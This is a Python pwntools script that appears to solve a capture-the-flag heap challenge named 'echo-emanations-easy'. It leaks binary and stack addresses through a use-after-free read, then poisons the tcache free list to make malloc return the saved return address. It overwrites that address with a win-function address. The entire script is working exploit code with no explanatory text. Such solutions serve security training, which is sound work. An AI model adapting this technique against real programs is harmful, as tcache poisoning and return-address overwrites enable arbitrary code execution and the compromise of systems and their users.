from pwn import *

p = process("/challenge/echo-emanations-easy")

print(p.clean())

p.sendline(b"malloc")
p.sendline(b"0")
p.sendline(b"32")

p.sendline(b"free")
p.sendline(b"0")

print(p.clean())

p.sendline(b"echo")
p.sendline(b"0")
p.sendline(b"0")

x = p.clean()
bin_addr = int(''.join([x.split(b"Data: ")[1].split(b"\n")[0].hex()[i:i+2] for i in range(0, len(x.split(b"Data: ")[1].split(b"\n")[0].hex()), 2)][::-1]), 16) # yes, sorry <3

print("[+] bin_addr :: " + hex(bin_addr))

bin_base_addr = bin_addr - 0x33f8
win_addr = bin_base_addr + 0x1b00

p.sendline(b"echo")
p.sendline(b"0")
p.sendline(b"8")

x = p.clean()
stack_addr = int(''.join([x.split(b"Data: ")[1].split(b"\n")[0].hex()[i:i+2] for i in range(0, len(x.split(b"Data: ")[1].split(b"\n")[0].hex()), 2)][::-1]), 16) # yes, sorry again <3

print("[+] stack_addr :: " + hex(stack_addr))

rbp_addr = stack_addr + 0x16e
saved_rip = rbp_addr + 0x8

print("[+] overwriting rip at :: " + hex(saved_rip))

p.sendline(b"malloc")
p.sendline(b"1")
p.sendline(b"8")

p.sendline(b"malloc")
p.sendline(b"2")
p.sendline(b"8")

p.sendline(b"malloc")
p.sendline(b"3")
p.sendline(b"8")

p.sendline(b"free")
p.sendline(b"3")

p.sendline(b"free")
p.sendline(b"2")

p.sendline(b"free")
p.sendline(b"1")

print()
print(p.clean())
print()

p.sendline(b"scanf")
p.sendline(b"1")
p.sendline(p64(saved_rip))

print()
print(p.clean())
print()

p.sendline(b"malloc")
p.sendline(b"4")
p.sendline(b"8")

p.sendline(b"malloc")
p.sendline(b"5")
p.sendline(b"8")

p.sendline(b"scanf")
p.sendline(b"5")
p.sendline(p64(win_addr))

print()
print(p.clean())
print()

p.sendline(b"quit")

print()
print(p.clean())
print()

p.close()
